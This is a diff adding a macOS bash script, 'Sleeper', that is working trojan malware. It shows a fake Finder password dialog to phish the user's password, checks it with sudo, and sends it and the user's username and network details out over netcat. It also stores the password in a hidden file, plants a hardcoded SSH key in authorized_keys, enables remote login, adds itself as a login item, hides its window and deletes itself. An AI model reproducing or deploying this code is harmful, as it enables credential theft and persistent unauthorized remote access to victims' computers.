@@ -1,0 +1,120 @@
+#!/bin/bash
+echo -n -e "\033]0;Sleeper\007"
+
+# - Sleeper Executable Start - # #################################################################################################
+cat >sleeperFile <<- "EOF2"
+#!/bin/bash
+echo -n -e "\033]0;Sleeper\007"
+
+
+chmod +x sleeperFileCode
+nohup sh ./sleeperFileCode >/dev/null &
+osascript -e 'tell application "Terminal" to close (every window whose name contains "Sleeper")' &
+EOF2
+# - Sleeper Executable End - # #################################################################################################
+
+# - Sleeper File Start - # #####################################################################################################
+cat >sleeperFileCode <<- "EOF3"
+#!/bin/bash
+
+# On Quit, Clean Up
+trap cleanUp EXIT
+
+# Define Quit Cleanup
+function cleanUp {
+
+  # Self Destruct
+rm -- "$0"
+
+}
+
+# Global Variables
+myIp="127.0.0.1"
+#myIp="10.38.27.118"
+
+wrong=""
+blank=""
+while [ "$wrong" != 0 ]; do
+
+# Create Finder textbox with password request
+password="$(osascript -e 'Tell application "System Events" to display dialog "Finder requires your password to continue." default answer "" with hidden answer with icon {"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}' -e 'text returned of result' 2>/dev/null)"
+
+# Check if password is valid
+sudo -k
+wrong=`echo $password | sudo -S echo "0"`
+blank=`echo randompasswordthatisntpossible | sudo -S echo "0"`
+
+# Terminate Keyword
+if [ $password == "terminate" ]; then
+exit
+fi
+
+# Clear sudo password memory
+sudo -k
+
+done
+
+# Extract Password over netcat (port 1001)
+echo $password | nc -n -v $myIp 1001
+
+# Store Password Locally
+mkdir ~/Library/Settings
+echo $password > ~/Library/Settings/pass
+
+# Use Password to turn on Remote Login (ssh)
+echo $password | sudo -S systemsetup -setremotelogin on
+EOF3
+# - Sleeper File End - # #####################################################################################################
+
+cat > sleeperTrojan <<- "EOF"
+# ----------------------------------------------------------------------- #
+#!/bin/bash
+
+# On Quit, Clean Up
+trap cleanUp EXIT
+
+# Define Quit Cleanup
+function cleanUp {
+
+  # Delete Temporary Files
+rm publicKey
+
+  # Self Destruct
+rm -- "$0"
+
+}
+
+# Global Variables
+myIp="127.0.0.1"
+#myIp="10.38.27.118"
+
+# Extract Username and Local IP over netcat (port 1000)
+path=`pwd`
+username=${path:7}
+info=`ifconfig | grep inet`
+allInfo=$username$info
+echo $allInfo | nc -n -v $myIp 1000 >/dev/null &
+
+# - Public Key File Start - #
+cat >publicKey <<EOF1
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiDSCAr7lD1lyLXOAjuUmGmFCHHNpK8mgi9Dtk3zhHq0iIJoJ9ZTSs+KETys/E8t0zpA46U3FATU7fHxykc6s1hiJ4AcL3ccOS4lzycPGeOiGuXwXrgGzfoD6JE27ocmh8Z71A8NCNxnkpij33EVnFKE931cgzCo+HBbPdH3CTBFek28s4wVh9YlWctl3jFmf/ZFAvjCkOhKc0FFK7iCC/lpAFu86Mw1Cx9hSNV1VC9R0B/crpWPnF8tNs9JDU0WweeESifa8nNH+fErokZVDj+eOVvJSE9BP3D0vYQke2kJFCeDfiKH7bdyjVj7DfO4PcMhGE71B2o58kbCedvbVz
+EOF1
+# - Public Key File End - #
+
+# Inject Public Key
+mkdir .ssh
+cat publicKey >> ~/.ssh/authorized_keys
+
+chmod +x sleeperFile
+osascript -e 'tell application "System Events" to make login item at end with properties {path:"sleeperFile", hidden:false}'
+
+# ----------------------------------------------------------------------- #
+EOF
+
+# Compile and silently run program (closing terminal window)
+chmod +x sleeperTrojan
+nohup sh ./sleeperTrojan >/dev/null &
+osascript -e 'tell application "Terminal" to close (every window whose name contains "Sleeper")' &
+
+# self destruct
+# rm -- "$0"
